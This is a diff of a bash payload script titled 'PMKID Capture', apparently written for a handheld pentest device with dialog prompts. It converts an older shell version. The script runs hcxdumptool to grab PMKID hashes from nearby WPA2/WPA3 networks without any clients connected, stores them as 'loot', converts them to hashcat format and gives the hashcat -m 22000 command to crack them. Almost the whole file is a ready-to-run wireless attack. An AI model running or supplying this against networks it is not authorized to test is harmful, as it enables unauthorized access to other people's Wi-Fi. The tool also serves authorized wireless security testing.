@@ -1,74 +1,80 @@
-#!/bin/sh
+#!/bin/bash
 # Title: PMKID Capture
 # Author: NullSec
 # Description: Capture PMKID hashes for offline cracking
-# Category: WiFi Attack
+# Category: nullsec/capture
 
 LOOT_DIR="/mmc/nullsec/pmkid"
 mkdir -p "$LOOT_DIR"
 
-echo "🔑 PMKID CAPTURE"
-echo "━━━━━━━━━━━━━━━━"
+PROMPT "PMKID CAPTURE
 
-[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }
+Capture PMKID hashes using
+hcxdumptool. Works WITHOUT
+any clients connected!
+
+Captured hashes can be
+cracked with hashcat -m 22000
+
+Press OK to configure."
 
 # Check for hcxdumptool
-if ! which hcxdumptool >/dev/null 2>&1; then
-    echo "[!] hcxdumptool not found!"
-    echo "[*] Install: opkg install /mmc/packages/hcxdumptool*.ipk"
+if ! command -v hcxdumptool >/dev/null 2>&1; then
+    ERROR_DIALOG "hcxdumptool not found!
+
+Install from packages:
+opkg install hcxdumptool"
     exit 1
 fi
 
-echo -n "Capture duration in seconds [60]: "
-read DURATION
-DURATION=${DURATION:-60}
+# Need raw wifi interface (not monitor)
+CAPTURE_IF="wlan1"
+[ ! -d "/sys/class/net/$CAPTURE_IF" ] && CAPTURE_IF="wlan0"
+
+DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
+
+resp=$(CONFIRMATION_DIALOG "START PMKID CAPTURE?
+
+Interface: $CAPTURE_IF
+Duration: ${DURATION}s
+
+Attacks WPA2/WPA3 networks
+without needing clients.
+
+Press OK to capture.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 TIMESTAMP=$(date +%Y%m%d_%H%M)
 PCAPNG_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.pcapng"
 HASH_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.22000"
 
-echo ""
-echo "[*] Starting PMKID capture..."
-echo "[*] This attacks WPA2/WPA3 without clients!"
-echo ""
+LOG "Starting PMKID capture..."
 
-# Use hcxdumptool for PMKID capture
-timeout $DURATION hcxdumptool -i wlan0 -o "$PCAPNG_FILE" --active_beacon --enable_status=15 2>&1
+# Stop monitor mode if active
+airmon-ng stop "${CAPTURE_IF}mon" 2>/dev/null
 
-if [ -f "$PCAPNG_FILE" ]; then
-    echo ""
-    echo "[*] Converting to hashcat format..."
-    
-    if which hcxpcapngtool >/dev/null 2>&1; then
-        hcxpcapngtool -o "$HASH_FILE" "$PCAPNG_FILE" 2>&1
-        
-        if [ -f "$HASH_FILE" ]; then
-            HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
-            echo "[+] Captured $HASH_COUNT PMKID hash(es)"
-        fi
-    else
-        echo "[!] hcxpcapngtool not found - raw pcapng saved"
+timeout "$DURATION" hcxdumptool -i "$CAPTURE_IF" -o "$PCAPNG_FILE" --active_beacon --enable_status=15 2>&1 &
+wait $!
+
+# Re-enable monitor
+airmon-ng start "$CAPTURE_IF" 2>/dev/null
+
+HASH_COUNT=0
+if [ -f "$PCAPNG_FILE" ] && [ -s "$PCAPNG_FILE" ]; then
+    if command -v hcxpcapngtool >/dev/null 2>&1; then
+        hcxpcapngtool -o "$HASH_FILE" "$PCAPNG_FILE" 2>/dev/null
+        [ -f "$HASH_FILE" ] && HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
     fi
-    
-    echo ""
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    echo "🔑 PMKID CAPTURE COMPLETE"
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    echo "PCAPNG: $PCAPNG_FILE"
-    [ -f "$HASH_FILE" ] && echo "Hashes: $HASH_FILE"
-    echo ""
-    echo "To crack on your computer:"
-    echo "  hashcat -m 22000 $HASH_FILE wordlist.txt"
-    echo ""
-    echo "Or use online services:"
-    echo "  - https://hashcat.net/cap2hashcat/"
-    echo "  - Upload .22000 file to cloud cracking"
-    
-    if [ -f "$HASH_FILE" ] && [ "$HASH_COUNT" -gt 0 ]; then
-        echo ""
-        echo "=== Captured Hashes ==="
-        cat "$HASH_FILE"
-    fi
-else
-    echo "[!] No capture file created"
 fi
+
+PROMPT "PMKID CAPTURE COMPLETE
+
+Hashes captured: $HASH_COUNT
+PCAPNG: $PCAPNG_FILE
+$([ -f "$HASH_FILE" ] && echo "Hashes: $HASH_FILE")
+
+Crack with:
+hashcat -m 22000 hashes.22000 wordlist.txt
+
+Press OK to exit."
